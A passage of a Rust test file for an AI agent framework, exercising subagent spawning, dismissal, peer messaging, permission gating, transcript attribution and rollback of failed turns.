            Some(AgentEvent::TurnComplete) => break,
            Some(_) => {}
            None => panic!("loop ended early"),
        }
    }

    // The child's loop processes its Quit asynchronously; poll briefly.
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(5);
    loop {
        let state = SessionStore::open(&child_dir.join("nudge.db"))
            .unwrap()
            .session(&child_id)
            .unwrap()
            .unwrap()
            .state;
        if state == SessionState::Ended {
            break;
        }
        assert!(
            std::time::Instant::now() < deadline,
            "dismissed child's row never read 'ended'"
        );
        tokio::time::sleep(std::time::Duration::from_millis(25)).await;
    }

    ui_tx.send((None, UiEvent::Quit)).await.unwrap();
    task.await.unwrap().unwrap();
    std::fs::remove_dir_all(&parent_dir).ok();
    std::fs::remove_dir_all(&child_dir).ok();
}

#[tokio::test]
async fn dismissed_child_is_answerable_from_inspect_session_alone() {
    let (parent_session, dir) = mk_session();
    let parent_id = parent_session.id.clone();
    let db = dir.join("nudge.db");

    // The child shares the parent's store, so the spawned_by FK edge is real.
    let child_session = Session::create_spawned(
        dir.clone(),
        SessionStore::open(&db).unwrap(),
        &parent_id,
        "count the files",
    )
    .unwrap();
    let child_id = child_session.id.clone();
    let child_host = SessionHost::spawn(
        mk_cfg(),
        FakeProvider,
        FakeBackend,
        child_session,
        Vec::new(),
        Vec::new(),
        crate::core::PeerWiring::default(),
    );

    // Drive one child turn so its transcript has content to inspect.
    let mut driver = child_host
        .attach(ClientIdentity::human("tester"))
        .await
        .expect("attach driver to child");
    driver
        .ui_tx
        .send(UiEvent::UserMessage {
            text: "count the files".into(),
        })
        .await
        .unwrap();
    loop {
        match driver.events.recv().await {
            Some(ControllerEvent::TurnComplete) => break,
            Some(_) => {}
            None => panic!("child stream ended before its turn completed"),
        }
    }
    drop(driver);

    let child_ctrl = child_host
        .attach(agent_who("parent"))
        .await
        .expect("attach parent edge to child");
    let mut peers = PeerSet::default();
    peers.register(PeerRegistration {
        controller: child_ctrl,
        who: agent_who("child-1"),
        host: Some(child_host),
        supervised: true,
        spawner: false,
    });
    let provider = ScriptedProvider {
        responses: std::sync::Mutex::new(vec![
            tool_use_response("DismissPeer", serde_json::json!({"peer": "child-1"})),
            end_turn_response("done"),
        ]),
        seen_messages: Default::default(),
        seen_tools: Default::default(),
    };
    let (ui_tx, ui_rx) = mpsc::channel(16);
    let (agent_tx, mut agent_rx) = mpsc::channel(16);
    let task = tokio::spawn(run_agent(
        mk_cfg(),
        provider,
        FakeBackend,
        parent_session,
        Vec::new(),
        mk_io(ui_rx, agent_tx, peers, None),
    ));
    ui_tx
        .send((
            None,
            UiEvent::UserMessage {
                text: "dismiss the child".into(),
            },
        ))
        .await
        .unwrap();
    loop {
        match agent_rx.recv().await {
            Some(AgentEvent::PermissionRequest { respond, .. }) => respond.send(true).unwrap(),
            Some(AgentEvent::TurnComplete) => break,
            Some(_) => {}
            None => panic!("loop ended early"),
        }
    }
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(5);
    loop {
        let state = SessionStore::open(&db)
            .unwrap()
            .session(&child_id)
            .unwrap()
            .unwrap()
            .state;
        if state == SessionState::Ended {
            break;
        }
        assert!(std::time::Instant::now() < deadline, "child never ended");
        tokio::time::sleep(std::time::Duration::from_millis(25)).await;
    }

    let out = crate::coding::tools::inspect_session_run(
        &serde_json::json!({"mode": "inspect", "session": child_id}),
        &SessionStore::open(&db).unwrap(),
        &dir.display().to_string(),
    )
    .unwrap();
    assert!(out.contains(&format!("session {child_id}")), "{out}");
    assert!(out.contains("state: ended"), "{out}");
    assert!(out.contains(&format!("spawned by: {parent_id}")), "{out}");
    assert!(out.contains("task: count the files"), "{out}");
    assert!(out.contains("live turns: 2"), "{out}");
    assert!(out.contains("count the files"), "{out}");
    assert!(out.contains("ok"), "the child's reply is visible: {out}");

    ui_tx.send((None, UiEvent::Quit)).await.unwrap();
    task.await.unwrap().unwrap();
    std::fs::remove_dir_all(&dir).ok();
}

#[tokio::test]
async fn dismiss_refuses_an_unsupervised_peer() {
    let (session, dir) = mk_session();
    let seen_messages = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let seen_tools = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let provider = ScriptedProvider {
        responses: std::sync::Mutex::new(vec![
            tool_use_response("DismissPeer", serde_json::json!({"peer": "parent-1"})),
            end_turn_response("ok"),
        ]),
        seen_messages: seen_messages.clone(),
        seen_tools: seen_tools.clone(),
    };

    let mut peers = PeerSet::default();
    let (parent_ctrl, parent_ev, _parent_ui) = fake_peer();
    peers.register(PeerRegistration::new(parent_ctrl, agent_who("parent-1")));
    // A supervised peer must exist for the DismissPeer schema to be offered at all.
    let (child_ctrl, _child_ev, _child_ui) = fake_peer();
    peers.register(supervised_reg(child_ctrl, agent_who("child-1")));

    let (ui_tx, ui_rx) = mpsc::channel(16);
    let (agent_tx, mut agent_rx) = mpsc::channel(16);
    let task = tokio::spawn(run_agent(
        mk_cfg(),
        provider,
        FakeBackend,
        session,
        Vec::new(),
        mk_io(ui_rx, agent_tx, peers, None),
    ));

    ui_tx
        .send((None, UiEvent::UserMessage { text: "go".into() }))
        .await
        .unwrap();
    loop {
        match agent_rx.recv().await {
            Some(AgentEvent::PermissionRequest { respond, .. }) => {
                respond.send(true).unwrap();
            }
            Some(AgentEvent::TurnComplete) => break,
            Some(_) => {}
            None => panic!("loop ended early"),
        }
    }

    let transcript = seen_messages.lock().unwrap().clone();
    assert!(
        transcript.iter().any(|m| m.content.iter().any(|b| matches!(
            b,
            ContentBlock::ToolResult { content, is_error: true, .. }
                if content.contains("not a subagent you spawned")
        ))),
        "expected the refusal: {transcript:?}"
    );
    assert!(
        parent_ev
            .send(ControllerEvent::Notice { text: "?".into() })
            .is_ok(),
        "the unsupervised peer must remain held"
    );

    ui_tx.send((None, UiEvent::Quit)).await.unwrap();
    task.await.unwrap().unwrap();
    std::fs::remove_dir_all(&dir).ok();
}

#[tokio::test]
async fn childless_session_still_drives_a_turn() {
    let (session, dir) = mk_session();
    let (ui_tx, ui_rx) = mpsc::channel(16);
    let (agent_tx, mut agent_rx) = mpsc::channel(16);
    let task = tokio::spawn(run_agent(
        mk_cfg(),
        FakeProvider,
        FakeBackend,
        session,
        Vec::new(),
        mk_io(ui_rx, agent_tx, PeerSet::default(), None),
    ));

    ui_tx
        .send((None, UiEvent::UserMessage { text: "hi".into() }))
        .await
        .unwrap();

    let mut saw_text = false;
    while let Some(ev) = agent_rx.recv().await {
        match ev {
            AgentEvent::AssistantText { text } => {
                assert_eq!(text, "ok");
                saw_text = true;
            }
            AgentEvent::TurnComplete => break,
            _ => {}
        }
    }
    assert!(saw_text, "expected the assistant reply for the driven turn");

    ui_tx.send((None, UiEvent::Quit)).await.unwrap();
    task.await.unwrap().unwrap();
    std::fs::remove_dir_all(&dir).ok();
}

#[tokio::test]
async fn return_edge_peer_drives_the_agent_it_holds() {
    let (session, dir) = mk_session();
    let parent = SessionHost::spawn(
        mk_cfg(),
        FakeProvider,
        FakeBackend,
        session,
        Vec::new(),
        Vec::new(),
        crate::core::peer::PeerWiring::default(),
    );

    let mut child_ctrl = parent.attach(agent_who("child-1")).await.unwrap();

    child_ctrl
        .ui_tx
        .send(UiEvent::UserMessage {
            text: "from child".into(),
        })
        .await
        .unwrap();

    let mut saw_reply = false;
    while let Some(ev) = child_ctrl.events.recv().await {
        if let ControllerEvent::AssistantText { text } = ev {
            assert_eq!(text, "ok");
            saw_reply = true;
            break;
        }
    }
    assert!(
        saw_reply,
        "the agent should take a turn driven over the return edge"
    );

    parent.shutdown().await.unwrap();
    std::fs::remove_dir_all(&dir).ok();
}

// Every re-narration is itself a Notice, so re-narrating a peer's Notice would loop
// unboundedly under mutual attach.
#[test]
fn peer_notice_does_not_renarrate_a_peer_notice() {
    assert_eq!(
        peer_notice(
            "child-1",
            &ControllerEvent::Notice {
                text: "[peer parent] anything".into()
            }
        ),
        None,
    );
    assert_eq!(
        peer_notice(
            "child-1",
            &ControllerEvent::AssistantText {
                text: "hello".into()
            }
        ),
        Some("[peer child-1] hello".to_string()),
    );
}

#[tokio::test]
async fn peer_message_is_attributed_in_the_transcript() {
    let (session, dir) = mk_session();
    let seen = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let (ui_tx, ui_rx) = mpsc::channel(16);
    let (agent_tx, mut agent_rx) = mpsc::channel(16);
    let task = tokio::spawn(run_agent(
        mk_cfg(),
        RecordingProvider { seen: seen.clone() },
        FakeBackend,
        session,
        Vec::new(),
        mk_io(ui_rx, agent_tx, PeerSet::default(), None),
    ));

    ui_tx
        .send((
            Some(agent_who("child-1")),
            UiEvent::UserMessage {
                text: "task done".into(),
            },
        ))
        .await
        .unwrap();
    while let Some(ev) = agent_rx.recv().await {
        if matches!(ev, AgentEvent::TurnComplete) {
            break;
        }
    }

    let transcript = seen.lock().unwrap().clone();
    match &transcript[0].content[0] {
        ContentBlock::Text { text } => {
            assert_eq!(text, "[message from peer child-1]\ntask done")
        }
        other => panic!("expected the attributed user turn, got {other:?}"),
    }

    // The log keeps clean text + the sender, so resume re-derives the attributed form.
    let rows = logged_rows(&dir);
    let first: Value = serde_json::from_str(&rows[0].content).unwrap();
    assert_eq!(first["content"][0]["text"], "task done");
    assert_eq!(
        rows[0].sender.as_ref().expect("sender persisted").name,
        "child-1"
    );

    ui_tx.send((None, UiEvent::Quit)).await.unwrap();
    task.await.unwrap().unwrap();
    std::fs::remove_dir_all(&dir).ok();
}

#[tokio::test]
async fn human_message_stays_bare_in_the_transcript() {
    let (session, dir) = mk_session();
    let seen = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let (ui_tx, ui_rx) = mpsc::channel(16);
    let (agent_tx, mut agent_rx) = mpsc::channel(16);
    let task = tokio::spawn(run_agent(
        mk_cfg(),
        RecordingProvider { seen: seen.clone() },
        FakeBackend,
        session,
        Vec::new(),
        mk_io(ui_rx, agent_tx, PeerSet::default(), None),
    ));

    ui_tx
        .send((
            Some(ClientIdentity::human("alice")),
            UiEvent::UserMessage { text: "hi".into() },
        ))
        .await
        .unwrap();
    while let Some(ev) = agent_rx.recv().await {
        if matches!(ev, AgentEvent::TurnComplete) {
            break;
        }
    }

    let transcript = seen.lock().unwrap().clone();
    match &transcript[0].content[0] {
        ContentBlock::Text { text } => assert_eq!(text, "hi"),
        other => panic!("expected the bare user turn, got {other:?}"),
    }

    ui_tx.send((None, UiEvent::Quit)).await.unwrap();
    task.await.unwrap().unwrap();
    std::fs::remove_dir_all(&dir).ok();
}

#[tokio::test]
async fn message_peer_tool_drives_the_named_peer() {
    let (session, dir) = mk_session();
    let seen_messages = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let seen_tools = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let provider = ScriptedProvider {
        responses: std::sync::Mutex::new(vec![
            tool_use_response(
                "MessagePeer",
                serde_json::json!({"peer": "child-1", "message": "do X"}),
            ),
            end_turn_response("done"),
        ]),
        seen_messages: seen_messages.clone(),
        seen_tools: seen_tools.clone(),
    };

    let mut peers = PeerSet::default();
    let (peer_ctrl, _peer_ev, mut peer_ui) = fake_peer();
    peers.register(PeerRegistration::new(peer_ctrl, agent_who("child-1")));

    let (ui_tx, ui_rx) = mpsc::channel(16);
    let (agent_tx, mut agent_rx) = mpsc::channel(16);
    let task = tokio::spawn(run_agent(
        mk_cfg(),
        provider,
        FakeBackend,
        session,
        Vec::new(),
        mk_io(ui_rx, agent_tx, peers, None),
    ));

    ui_tx
        .send((None, UiEvent::UserMessage { text: "go".into() }))
        .await
        .unwrap();
    while let Some(ev) = agent_rx.recv().await {
        if matches!(ev, AgentEvent::TurnComplete) {
            break;
        }
    }

    match peer_ui.recv().await {
        Some(UiEvent::UserMessage { text }) => assert_eq!(text, "do X"),
        other => panic!("peer expected the driven message, got {other:?}"),
    }
    // The schema is only offered because a peer is held.
    assert!(seen_tools.lock().unwrap().contains(&"MessagePeer".into()));
    let transcript = seen_messages.lock().unwrap().clone();
    assert!(
        transcript.iter().any(|m| m.content.iter().any(|b| matches!(
            b,
            ContentBlock::ToolResult { content, is_error: false, .. }
                if content.contains("message sent to child-1")
        ))),
        "expected the ok tool_result in the transcript: {transcript:?}"
    );

    ui_tx.send((None, UiEvent::Quit)).await.unwrap();
    task.await.unwrap().unwrap();
    std::fs::remove_dir_all(&dir).ok();
}

#[tokio::test]
async fn message_peer_unknown_name_lists_roster() {
    let (session, dir) = mk_session();
    let seen_messages = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let seen_tools = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let provider = ScriptedProvider {
        responses: std::sync::Mutex::new(vec![
            tool_use_response(
                "MessagePeer",
                serde_json::json!({"peer": "nobody", "message": "hello"}),
            ),
            end_turn_response("ok"),
        ]),
        seen_messages: seen_messages.clone(),
        seen_tools: seen_tools.clone(),
    };

    let mut peers = PeerSet::default();
    let (peer_ctrl, _peer_ev, _peer_ui) = fake_peer();
    peers.register(PeerRegistration::new(peer_ctrl, agent_who("child-1")));

    let (ui_tx, ui_rx) = mpsc::channel(16);
    let (agent_tx, mut agent_rx) = mpsc::channel(16);
    let task = tokio::spawn(run_agent(
        mk_cfg(),
        provider,
        FakeBackend,
        session,
        Vec::new(),
        mk_io(ui_rx, agent_tx, peers, None),
    ));

    ui_tx
        .send((None, UiEvent::UserMessage { text: "go".into() }))
        .await
        .unwrap();
    while let Some(ev) = agent_rx.recv().await {
        if matches!(ev, AgentEvent::TurnComplete) {
            break;
        }
    }

    let transcript = seen_messages.lock().unwrap().clone();
    assert!(
        transcript.iter().any(|m| m.content.iter().any(|b| matches!(
            b,
            ContentBlock::ToolResult { content, is_error: true, .. }
                if content.contains("no peer named 'nobody'") && content.contains("child-1")
        ))),
        "expected the roster-bearing error tool_result: {transcript:?}"
    );

    ui_tx.send((None, UiEvent::Quit)).await.unwrap();
    task.await.unwrap().unwrap();
    std::fs::remove_dir_all(&dir).ok();
}

// Running the factory empties the slot, so a test can tell whether it ran.
fn stub_factory(slot: std::sync::Arc<std::sync::Mutex<Option<Controller>>>) -> PeerFactory {
    Box::new(move |task, _self_handle| {
        let slot = slot.clone();
        Box::pin(async move {
            let controller = slot
                .lock()
                .unwrap()
                .take()
                .expect("factory called more than once");
            let mut who = agent_who("child-test");
            who.session_id = Some("sess-1".into());
            who.task = Some(task);
            Ok(PeerRegistration {
                controller,
                who,
                host: None,
                supervised: true,
                spawner: false,
            })
        })
    })
}

#[tokio::test]
async fn spawn_tool_gates_then_registers_the_child() {
    let (session, dir) = mk_session();
    let seen_messages = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let seen_tools = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let provider = ScriptedProvider {
        responses: std::sync::Mutex::new(vec![
            tool_use_response("Spawn", serde_json::json!({"task": "count files"})),
            end_turn_response("spawned"),
        ]),
        seen_messages: seen_messages.clone(),
        seen_tools: seen_tools.clone(),
    };

    let (peer_ctrl, peer_ev, _peer_ui) = fake_peer();
    let slot = std::sync::Arc::new(std::sync::Mutex::new(Some(peer_ctrl)));

    let (ui_tx, ui_rx) = mpsc::channel(16);
    let (agent_tx, mut agent_rx) = mpsc::channel(16);
    let task = tokio::spawn(run_agent(
        mk_cfg(),
        provider,
        FakeBackend,
        session,
        Vec::new(),
        AgentIo {
            ui_rx,
            agent_tx,
            peers: PeerSet::default(),
            peer_register_rx: None,
            peer_factory: Some(stub_factory(slot)),
            peer_dialer: None,
            self_handle: crate::core::host::spawn_bare_broker(Vec::new()).handle,
            multi_driver: std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false)),
        },
    ));

    ui_tx
        .send((None, UiEvent::UserMessage { text: "go".into() }))
        .await
        .unwrap();

    loop {
        match agent_rx.recv().await {
            Some(AgentEvent::PermissionRequest {
                tool_name,
                summary,
                respond,
                ..
            }) => {
                assert_eq!(tool_name, "Spawn");
                assert!(summary.contains("spawn a subagent"), "summary: {summary}");
                respond.send(true).unwrap();
            }
            Some(AgentEvent::TurnComplete) => break,
            Some(_) => {}
            None => panic!("loop ended early"),
        }
    }

    // Both peer tools are offered because a factory exists, even with no peer held.
    let tools = seen_tools.lock().unwrap().clone();
    assert!(tools.contains(&"Spawn".into()) && tools.contains(&"MessagePeer".into()));
    let transcript = seen_messages.lock().unwrap().clone();
    assert!(
        transcript.iter().any(|m| m.content.iter().any(|b| matches!(
            b,
            ContentBlock::ToolResult { content, is_error: false, .. }
                if content.contains("spawned peer child-test (session sess-1)")
                    && content.contains("count files")
        ))),
        "expected the spawn record in the transcript: {transcript:?}"
    );

    peer_ev
        .send(ControllerEvent::AssistantText {
            text: "child working".into(),
        })
        .unwrap();
    loop {
        match agent_rx.recv().await {
            Some(AgentEvent::Notice { text }) if text.contains("child-test") => break,
            Some(_) => {}
            None => panic!("expected the registered child's Notice"),
        }
    }

    ui_tx.send((None, UiEvent::Quit)).await.unwrap();
    task.await.unwrap().unwrap();
    std::fs::remove_dir_all(&dir).ok();
}

#[tokio::test]
async fn spawn_denial_does_not_run_the_factory() {
    let (session, dir) = mk_session();
    let seen_messages = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let seen_tools = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let provider = ScriptedProvider {
        responses: std::sync::Mutex::new(vec![
            tool_use_response("Spawn", serde_json::json!({"task": "count files"})),
            end_turn_response("ok"),
        ]),
        seen_messages: seen_messages.clone(),
        seen_tools: seen_tools.clone(),
    };

    let (peer_ctrl, _peer_ev, _peer_ui) = fake_peer();
    let slot = std::sync::Arc::new(std::sync::Mutex::new(Some(peer_ctrl)));

    let (ui_tx, ui_rx) = mpsc::channel(16);
    let (agent_tx, mut agent_rx) = mpsc::channel(16);
    let task = tokio::spawn(run_agent(
        mk_cfg(),
        provider,
        FakeBackend,
        session,
        Vec::new(),
        AgentIo {
            ui_rx,
            agent_tx,
            peers: PeerSet::default(),
            peer_register_rx: None,
            peer_factory: Some(stub_factory(slot.clone())),
            peer_dialer: None,
            self_handle: crate::core::host::spawn_bare_broker(Vec::new()).handle,
            multi_driver: std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false)),
        },
    ));

    ui_tx
        .send((None, UiEvent::UserMessage { text: "go".into() }))
        .await
        .unwrap();
    loop {
        match agent_rx.recv().await {
            Some(AgentEvent::PermissionRequest { respond, .. }) => {
                respond.send(false).unwrap();
            }
            Some(AgentEvent::TurnComplete) => break,
            Some(_) => {}
            None => panic!("loop ended early"),
        }
    }

    // A denial pauses for fresh guidance; supply it so the turn closes.
    ui_tx
        .send((
            None,
            UiEvent::UserMessage {
                text: "never mind".into(),
            },
        ))
        .await
        .unwrap();
    while let Some(ev) = agent_rx.recv().await {
        if matches!(ev, AgentEvent::TurnComplete) {
            break;
        }
    }

    assert!(
        slot.lock().unwrap().is_some(),
        "denial must not run the factory"
    );
    let transcript = seen_messages.lock().unwrap().clone();
    assert!(
        transcript.iter().any(|m| m.content.iter().any(|b| matches!(
            b,
            ContentBlock::ToolResult { content, is_error: true, .. }
                if content.contains("denied")
        ))),
        "expected the denial tool_result: {transcript:?}"
    );

    ui_tx.send((None, UiEvent::Quit)).await.unwrap();
    task.await.unwrap().unwrap();
    std::fs::remove_dir_all(&dir).ok();
}

// An agent sender is always prefixed, a human only in a multi-party transcript, and a
// sender-less entry (its text may carry a baked-in prefix) passes through untouched.
#[test]
fn resume_messages_applies_attribution_from_persisted_sender() {
    use crate::core::session::LoggedMessage;

    let user = |text: &str| Message {
        role: "user".into(),
        content: vec![ContentBlock::Text { text: text.into() }],
    };
    let entries = vec![
        LoggedMessage {
            message: user("do it"),
            sender: Some(ClientIdentity {
                kind: ClientKind::Agent,
                name: "child-x".into(),
                session_id: None,
                task: None,
            }),
        },
        LoggedMessage {
            message: user("hello"),
            sender: Some(ClientIdentity::human("alice")),
        },
        LoggedMessage {
            message: user("[message from peer old]\nlegacy"),
            sender: None,
        },
    ];

    let msgs = super::resume_messages(&entries);
    let texts: Vec<&str> = msgs
        .iter()
        .map(|m| match &m.content[0] {
            ContentBlock::Text { text } => text.as_str(),
            other => panic!("expected text block, got {other:?}"),
        })
        .collect();
    assert_eq!(texts[0], "[message from peer child-x]\ndo it");
    assert_eq!(texts[1], "[message from alice]\nhello");
    assert_eq!(texts[2], "[message from peer old]\nlegacy");

    let solo = vec![
        LoggedMessage {
            message: user("just me"),
            sender: Some(ClientIdentity::human("alice")),
        },
        LoggedMessage {
            message: user("still me"),
            sender: Some(ClientIdentity::human("alice")),
        },
    ];
    let msgs = super::resume_messages(&solo);
    match &msgs[0].content[0] {
        ContentBlock::Text { text } => assert_eq!(text, "just me"),
        other => panic!("expected text block, got {other:?}"),
    }
}

fn logged_roles(dir: &std::path::Path) -> Vec<String> {
    logged_lines(dir)
        .iter()
        .map(|content| {
            let msg: Value = serde_json::from_str(content).unwrap();
            msg["role"].as_str().unwrap().to_string()
        })
        .collect()
}

fn logged_lines(dir: &std::path::Path) -> Vec<String> {
    logged_rows(dir).into_iter().map(|r| r.content).collect()
}

fn logged_rows(dir: &std::path::Path) -> Vec<crate::core::store::MessageRow> {
    let store = SessionStore::open(&dir.join("nudge.db")).unwrap();
    let listings = store.list_by_cwd(&dir.display().to_string()).unwrap();
    match listings.first() {
        Some(l) => store.load_transcript(&l.row.id).unwrap(),
        None => Vec::new(),
    }
}

async fn drain_until(rx: &mut mpsc::Receiver<AgentEvent>, pred: impl Fn(&AgentEvent) -> bool) {
    while let Some(ev) = rx.recv().await {
        if pred(&ev) {
            return;
        }
    }
    panic!("event stream ended before the awaited event");
}

// The failed turn's user entry is never committed, so a resume sees no phantom entry
// and no consecutive user roles.
#[tokio::test]
async fn provider_error_midturn_leaves_no_phantom_log_entry() {
    let (session, dir) = mk_session();
    let id = session.id.clone();
    let (ui_tx, ui_rx) = mpsc::channel(16);
    let (agent_tx, mut agent_rx) = mpsc::channel(16);
    let task = tokio::spawn(run_agent(
        mk_cfg(),
        FailOnNthProvider {
            calls: std::sync::Mutex::new(0),
            fail_on: 2,
        },
        FakeBackend,
        session,
        Vec::new(),
        mk_io(ui_rx, agent_tx, PeerSet::default(), None),
    ));

    ui_tx
        .send((None, UiEvent::UserMessage { text: "hi".into() }))
        .await
        .unwrap();
    drain_until(&mut agent_rx, |e| matches!(e, AgentEvent::TurnComplete)).await;

    // Provider call 2 fails.
    ui_tx
        .send((
            None,
            UiEvent::UserMessage {
                text: "again".into(),
            },
        ))
        .await
        .unwrap();
    drain_until(&mut agent_rx, |e| matches!(e, AgentEvent::Error { .. })).await;

    ui_tx
        .send((
            None,
            UiEvent::UserMessage {
                text: "retry".into(),
            },
        ))
        .await
        .unwrap();
    drain_until(&mut agent_rx, |e| matches!(e, AgentEvent::TurnComplete)).await;

    ui_tx.send((None, UiEvent::Quit)).await.unwrap();
    task.await.unwrap().unwrap();

    let lines = logged_lines(&dir);
    assert!(
        !lines.iter().any(|l| l.contains("again")),
        "rolled-back turn must not be logged: {lines:?}"
    );
    assert_eq!(
        logged_roles(&dir),
        vec!["user", "assistant", "user", "assistant"],
        "log holds exactly the committed turns"
    );

    let resumed = Session::open(
        &id,
        dir.clone(),
        SessionStore::open(&dir.join("nudge.db")).unwrap(),
    )
    .unwrap();
    let msgs = super::resume_messages(&resumed.entries);
    let roles: Vec<&str> = msgs.iter().map(|m| m.role.as_str()).collect();
    assert_eq!(roles, vec!["user", "assistant", "user", "assistant"]);
    assert!(
        roles.windows(2).all(|w| w != ["user", "user"]),
        "resume must not surface consecutive user roles: {roles:?}"
    );

    std::fs::remove_dir_all(&dir).ok();
}

// A failed steering inference is not retried: it escalates to the human at once.
#[tokio::test]
async fn steering_failure_leaves_no_checkin_in_the_log() {
    let (session, dir) = mk_session();
    let mut peers = PeerSet::default();
    let (peer_ctrl, peer_ev, mut peer_ui) = fake_peer();
    peers.register(supervised_reg(peer_ctrl, agent_who("child-1")));

    let (ui_tx, ui_rx) = mpsc::channel(16);
    let (agent_tx, mut agent_rx) = mpsc::channel(16);
    let task = tokio::spawn(run_agent(
        mk_cfg(),
        FailOnNthProvider {
            calls: std::sync::Mutex::new(0),
            fail_on: 1,
        },
        FakeBackend,
        session,
        Vec::new(),
        mk_io(ui_rx, agent_tx, peers, None),
    ));

    peer_ev
        .send(ControllerEvent::PermissionRequest {
            tool_use_id: "t1".into(),
            tool_name: "Bash".into(),
            summary: "run ls".into(),
        })
        .unwrap();

    let (_, notices) = answer_escalation(&mut agent_rx, true).await;
    assert!(
        notices
            .iter()
            .any(|n| n.contains("simulated provider failure")),
        "{notices:?}"
    );
    match peer_ui.recv().await {
        Some(UiEvent::PermissionResponse { allow, .. }) => assert!(allow),
        other => panic!("expected the human's allow routed to the peer, got {other:?}"),
    }

    ui_tx.send((None, UiEvent::Quit)).await.unwrap();
    task.await.unwrap().unwrap();

    let lines = logged_lines(&dir);
    assert!(
        !lines.iter().any(|l| l.contains("check-in from peer")),
        "rolled-back check-in must not be logged: {lines:?}"
    );

    std::fs::remove_dir_all(&dir).ok();
}

#[tokio::test]
async fn successful_multi_iteration_turn_persists_all_entries() {
    let (session, dir) = mk_session();
    let seen_messages = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let seen_tools = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let provider = ScriptedProvider {
        responses: std::sync::Mutex::new(vec![
            tool_use_response("Bash", serde_json::json!({})),
            end_turn_response("done"),
        ]),
        seen_messages,
        seen_tools,
    };

    let (ui_tx, ui_rx) = mpsc::channel(16);
    let (agent_tx, mut agent_rx) = mpsc::channel(16);
    let task = tokio::spawn(run_agent(
        mk_cfg(),
        provider,
        FakeBackend,
        session,
        Vec::new(),
        mk_io(ui_rx, agent_tx, PeerSet::default(), None),
    ));

    ui_tx
        .send((None, UiEvent::UserMessage { text: "go".into() }))
        .await
        .unwrap();
    drain_until(&mut agent_rx, |e| matches!(e, AgentEvent::TurnComplete)).await;

    ui_tx.send((None, UiEvent::Quit)).await.unwrap();
    task.await.unwrap().unwrap();

    assert_eq!(
        logged_roles(&dir),
        vec!["user", "assistant", "user", "assistant"],
        "every mid-turn entry is committed when the turn completes"
    );

    std::fs::remove_dir_all(&dir).ok();
}

#[tokio::test]
async fn peers_command_reports_the_roster() {
    let (session, dir) = mk_session();
    let (ui_tx, ui_rx) = mpsc::channel(16);
    let (agent_tx, mut agent_rx) = mpsc::channel(16);
    let mut peers = PeerSet::default();
    let (peer_ctrl, _peer_ev, _peer_ui) = fake_peer();
    peers.register(supervised_reg(peer_ctrl, agent_who("child-1")));
    let task = tokio::spawn(run_agent(
        mk_cfg(),
        FakeProvider,
        FakeBackend,
        session,
        Vec::new(),
        mk_io(ui_rx, agent_tx, peers, None),
    ));

    ui_tx
        .send((
            None,
            UiEvent::Command {
                line: "/peers".into(),
            },
        ))
        .await
        .unwrap();
    match agent_rx.recv().await {
        Some(AgentEvent::Notice { text }) => {
            assert!(text.contains("child-1"), "roster names the peer: {text}");
            assert!(text.contains("agent"), "roster shows the kind: {text}");
            assert!(
                text.contains("supervised"),
                "roster shows supervision: {text}"
            );
        }
        other => panic!("expected roster Notice, got {other:?}"),
    }

    ui_tx.send((None, UiEvent::Quit)).await.unwrap();
    task.await.unwrap().unwrap();
    std::fs::remove_dir_all(&dir).ok();
}

#[tokio::test]
async fn peers_command_with_no_peers_says_so() {
    let (session, dir) = mk_session();
    let (ui_tx, ui_rx) = mpsc::channel(16);
    let (agent_tx, mut agent_rx) = mpsc::channel(16);
    let task = tokio::spawn(run_agent(
        mk_cfg(),
        FakeProvider,
        FakeBackend,
        session,
        Vec::new(),
        mk_io(ui_rx, agent_tx, PeerSet::default(), None),
    ));

    ui_tx
        .send((
            None,
            UiEvent::Command {
                line: "/peers".into(),
            },
        ))
        .await
        .unwrap();
    match agent_rx.recv().await {
        Some(AgentEvent::Notice { text }) => assert_eq!(text, "no peers held"),
        other => panic!("expected empty-roster Notice, got {other:?}"),
    }

    ui_tx.send((None, UiEvent::Quit)).await.unwrap();
    task.await.unwrap().unwrap();
    std::fs::remove_dir_all(&dir).ok();
}

#[tokio::test]
async fn peer_change_reemits_capabilities_roster() {
    let (session, dir) = mk_session();
    let (ui_tx, ui_rx) = mpsc::channel(16);
    let (agent_tx, mut agent_rx) = mpsc::channel(16);
    let (reg_tx, reg_rx) = mpsc::unbounded_channel();
    let task = tokio::spawn(run_agent(
        mk_cfg(),
        FakeProvider,
        FakeBackend,
        session,
        Vec::new(),
        mk_io(ui_rx, agent_tx, PeerSet::default(), Some(reg_rx)),
    ));

    let (peer_ctrl, peer_ev, _peer_ui) = fake_peer();
    reg_tx
        .send(PeerRegistration::new(peer_ctrl, agent_who("child-1")))
        .unwrap();
    // Registration emits a connect Notice before the Capabilities roster.
    let mut saw_roster = false;
    for _ in 0..4 {
        match agent_rx.recv().await {
            Some(AgentEvent::Capabilities { peers, .. }) => {
                assert_eq!(peers.len(), 1);
                assert_eq!(peers[0].name, "child-1");
                assert!(!peers[0].supervised);
                saw_roster = true;
                break;
            }
            Some(_) => continue,
            None => break,
        }
    }
    assert!(saw_roster, "expected Capabilities after registration");

    drop(peer_ev);
    let mut saw_empty_roster = false;
    for _ in 0..4 {
        match agent_rx.recv().await {
            Some(AgentEvent::Capabilities { peers, .. }) => {
                assert!(peers.is_empty(), "roster empties after the reap");
                saw_empty_roster = true;
                break;
            }
            Some(_) => continue,
            None => break,
        }
    }
    assert!(
        saw_empty_roster,
        "expected a Capabilities re-emit after reap"
    );

    ui_tx.send((None, UiEvent::Quit)).await.unwrap();
    task.await.unwrap().unwrap();
    std::fs::remove_dir_all(&dir).ok();
}

#[test]
fn roster_system_text_lists_held_peers() {
